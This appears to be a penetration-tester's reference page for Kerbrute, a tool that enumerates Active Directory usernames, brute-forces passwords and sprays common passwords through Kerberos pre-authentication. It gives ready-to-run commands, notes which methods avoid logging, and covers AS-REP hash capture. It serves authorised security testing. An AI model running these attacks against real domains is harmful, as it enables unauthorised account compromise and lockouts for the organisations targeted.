---
title: "Kerbrute"
category: "active-directory"
tags:
  - kerberos
  - enumeration
  - bruteforce
  - password-spray
  - windows
sources:
  - name: GitHub Repository
    url: https://github.com/ropnop/kerbrute
last_updated: 2025-12-27
---

# Kerbrute

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
  - [User Enumeration](#user-enumeration)
  - [Brute Force User](#brute-force-user)
  - [Password Spray](#password-spray)
- [Common Options](#common-options)
- [Documentation](#documentation)

## Overview

Kerbrute is a tool for quickly bruteforcing and enumerating valid Active Directory accounts through Kerberos Pre-Authentication.

**Key Features:**
- Fast Kerberos-based authentication testing (single UDP frame per attempt)
- Stealthier than traditional bruteforce (no Event ID 4625 for pre-auth failures)
- Multi-threaded with configurable thread count
- Safe mode to prevent account lockouts
- AS-REP hash capture for offline cracking

**Attack Modes:**
| Mode | Description |
|------|-------------|
| `userenum` | Enumerate valid usernames (no lockout risk) |
| `bruteuser` | Bruteforce single user with password list |
| `passwordspray` | Test single password against user list |
| `bruteforce` | Test username:password combos from file/stdin |

## Installation

**Pre-compiled binaries:**
```bash
# Download from releases
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
```

**From source:**
```bash
go install github.com/ropnop/kerbrute@latest
```

## Quick Start

### User Enumeration

Enumerate valid domain usernames without triggering account lockouts:

```bash
# Basic enumeration
kerbrute userenum -d domain.local users.txt

# Specify domain controller
kerbrute userenum -d domain.local --dc 10.10.10.1 users.txt
```

> Note: Generates Event ID 4768 if Kerberos logging is enabled.

### Brute Force User

Bruteforce a single user's password (verify no lockout policy first):

```bash
kerbrute bruteuser -d domain.local passwords.txt username
```

> Warning: This WILL increment failed login count and may lock accounts.

### Password Spray

Test a single password against multiple users:

```bash
# Basic spray
kerbrute passwordspray -d domain.local users.txt 'Password123'

# With delay between attempts
kerbrute passwordspray -d domain.local --delay 1000 users.txt 'Summer2024!'

# Safe mode (abort on lockout detection)
kerbrute passwordspray -d domain.local --safe users.txt 'Welcome1'
```

> Warning: This WILL increment failed login count and may lock accounts.

## Common Options

| Option | Description |
|--------|-------------|
| `-d, --domain` | Target domain (e.g., corp.local) |
| `--dc` | Domain Controller IP/hostname |
| `-t, --threads` | Number of threads (default: 10) |
| `--delay` | Delay in ms between attempts (forces single thread) |
| `--safe` | Abort if any account is locked out |
| `-o, --output` | Output file for results |
| `-v, --verbose` | Log failures and errors |
| `--hash-file` | Save captured AS-REP hashes to file |
| `--downgrade` | Force RC4 encryption (arcfour-hmac-md5) |

## Documentation

| File | Description |
|------|-------------|
| [README.md](README.md) | This file - overview and quick start guide |
| [techniques.md](techniques.md) | Advanced techniques, Kerberos internals, and attack workflows |
| [official_docs.md](official_docs.md) | Extended documentation and examples |
